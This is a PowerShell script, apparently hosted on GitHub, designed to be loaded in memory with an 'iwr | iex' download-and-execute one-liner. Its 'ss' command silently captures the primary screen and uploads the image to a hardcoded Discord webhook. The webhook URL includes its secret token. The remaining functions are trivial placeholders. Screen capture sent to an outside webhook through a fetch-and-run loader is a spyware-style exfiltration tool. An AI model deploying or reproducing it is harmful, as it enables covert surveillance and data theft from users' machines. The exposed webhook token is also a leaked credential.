# Remote Library PowerShell Script
# This script defines session‑only functions that are available after loading via
#   iwr <raw_github_url> | iex
# No persistence is performed; functions exist only for the current PowerShell session.

# Helper: Send a file (image) to a Discord webhook
function Invoke-DiscordWebhook {
    param (
        [Parameter(Mandatory = $true)][string]$WebhookUrl,
        [Parameter(Mandatory = $true)][string]$FilePath
    )
    try {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        $base64 = [System.Convert]::ToBase64String($bytes)
        $json = @{"content" = "Screenshot"; "attachments" = @(@{"id" = "0"; "filename" = (Split-Path $FilePath -Leaf); "content_type" = "image/png"; "size" = $bytes.Length; "url" = ""; "proxy_url" = ""; "height" = $null; "width" = $null; "data" = $base64 }) } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $json -ContentType 'application/json'
    }
    catch {
        Write-Error "Failed to send webhook: $_"
    }
}

# Command: ss – capture screenshot and post to Discord webhook
function ss {
    param (
        [string]$WebhookUrl = "https://discord.com/api/webhooks/1400512221276147774/eo5r_JV1-r6QdgS1wlngW2-0Kbh3UV_iBcTh-yl9mXUMRuWaWVI4RfZnud9jPk8JQYCt"
    )
    # Use .NET to capture the primary screen
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "screenshot_{0}.png" -f ([guid]::NewGuid()))
    $bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png)
    Invoke-DiscordWebhook -WebhookUrl $WebhookUrl -FilePath $tempPath
    Remove-Item $tempPath -ErrorAction SilentlyContinue
}

# Placeholder command: test
function test {
    Write-Host "Test command executed."
}

# Simple greeting command: hello
function hello {
    Write-Host "Hello, world!"
}

# Help command – list available remote‑library commands
function show-help {
    $commands = @{
        "ss"        = "Capture screenshot and POST to Discord webhook"
        "test"      = "Placeholder test command"
        "hello"     = "Print greeting message"
        "show-help" = "Display this help information"
    }
    Write-Host "Remote Library Commands:`n"
    foreach ($k in $commands.Keys) {
        Write-Host "  $k - $($commands[$k])"
    }
}

# Export the command list to a global variable for easy enumeration (optional)
$global:RemoteLibCommands = @('ss', 'test', 'hello', 'show-help')

# End of remote_lib.ps1
